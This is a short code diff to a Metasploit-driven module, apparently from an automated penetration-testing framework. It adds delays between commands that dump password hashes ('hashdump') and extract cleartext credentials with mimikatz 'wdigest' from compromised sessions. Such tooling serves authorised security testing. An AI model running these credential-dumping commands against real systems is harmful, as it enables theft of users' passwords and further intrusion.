@@ -42,6 +42,7 @@ class msf_dumphashes(actionModule):
                             msf.execute("sessions -i " + str(s) + "\n")
                             msf.sleep(int(self.config['msfexploitdelay']))
                             msf.execute("hashdump\n")
+                            msf.sleep(int(self.config['msfexploitdelay']))
                             msf.execute("background\n")
 
                             # TODO - process results and store results in KB
@@ -54,9 +55,11 @@ class msf_dumphashes(actionModule):
                             kb.add("host/" + t + "/files/" + self.shortName + "/" + outfile.replace("/", "%2F"))
 
                             msf.execute("sessions -i " + str(s) + "\n")
+                            msf.sleep(int(self.config['msfexploitdelay']))
                             msf.execute("load mimikatz\n")
                             msf.sleep(int(self.config['msfexploitdelay']))
                             msf.execute("wdigest\n")
+                            msf.sleep(int(self.config['msfexploitdelay']))
                             msf.execute("background\n")
 
                             # TODO - process results and store results in KB
